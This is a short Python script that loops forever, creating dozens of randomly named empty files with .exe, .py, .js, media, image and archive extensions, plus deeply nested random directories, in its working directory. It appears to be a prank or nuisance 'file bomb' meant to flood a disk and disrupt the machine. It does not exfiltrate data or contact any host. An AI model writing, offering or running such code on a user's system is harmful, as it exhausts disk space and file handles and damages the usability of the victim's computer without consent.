import os
import time
import string
from random import *

characters = string.ascii_letters + string.digits


while 1 ==1:
    
    
    name =  "".join(choice(characters) for x in range(randint(15, 15)))
    othername =  "".join(choice(characters) for x in range(randint(20, 20)))
    anothername =  "".join(choice(characters) for x in range(randint(5, 20)))
    morename =  "".join(choice(characters) for x in range(randint(5, 20)))
    hehemorename =  "".join(choice(characters) for x in range(randint(5, 20)))
    hehe =  "".join(choice(characters) for x in range(randint(5, 15)))

    f= open(name+".txt","w+")
    d = os.path.dirname(__file__) # directory of script
    p = r''+name+'/'+othername+'/'+anothername+'/'+morename+'/'+hehemorename+'/'+hehe+'/oof'.format(d) # path to be created
    f= open(name+".exe","w+")
    f= open(name+".py","w+")
    f= open(name+".js","w+")
    f= open(name+".mp4","w+")
    f= open(name+".mp3","w+")
    f= open(name+".zip","w+")
    f= open(name+".png","w+")
    f= open(name+".jpg","w+")
    f= open(name+".ico","w+")
    f= open(name+".csv","w+")
    f= open(othername+".exe","w+")
    f= open(othername+".py","w+")
    f= open(othername+".js","w+")
    f= open(othername+".mp4","w+")
    f= open(othername+".mp3","w+")
    f= open(othername+".zip","w+")
    f= open(othername+".png","w+")
    f= open(othername+".jpg","w+")
    f= open(othername+".ico","w+")
    f= open(othername+".csv","w+")
    f= open(anothername+".exe","w+")
    f= open(anothername+".py","w+")
    f= open(anothername+".js","w+")
    f= open(anothername+".mp4","w+")
    f= open(anothername+".mp3","w+")
    f= open(anothername+".zip","w+")
    f= open(anothername+".png","w+")
    f= open(anothername+".jpg","w+")
    f= open(anothername+".ico","w+")
    f= open(anothername+".csv","w+")
    f= open(morename+".exe","w+")
    f= open(morename+".py","w+")
    f= open(morename+".js","w+")
    f= open(morename+".mp4","w+")
    f= open(morename+".mp3","w+")
    f= open(morename+".zip","w+")
    f= open(morename+".png","w+")
    f= open(morename+".jpg","w+")
    f= open(morename+".ico","w+")
    f= open(morename+".csv","w+")
    f= open(hehemorename+".exe","w+")
    f= open(hehemorename+".py","w+")
    f= open(hehemorename+".js","w+")
    f= open(hehemorename+".mp4","w+")
    f= open(hehemorename+".mp3","w+")
    f= open(hehemorename+".zip","w+")
    f= open(hehemorename+".png","w+")
    f= open(hehemorename+".jpg","w+")
    f= open(hehemorename+".ico","w+")
    f= open(hehemorename+".csv","w+")
    f= open(hehe+".exe","w+")
    f= open(hehe+".py","w+")
    f= open(hehe+".js","w+")
    f= open(hehe+".mp4","w+")
    f= open(hehe+".mp3","w+")
    f= open(hehe+".zip","w+")
    f= open(hehe+".png","w+")
    f= open(hehe+".jpg","w+")
    f= open(hehe+".ico","w+")
    f= open(hehe+".csv","w+")
    

    try:
        os.makedirs(p)
    except OSError:
        pass
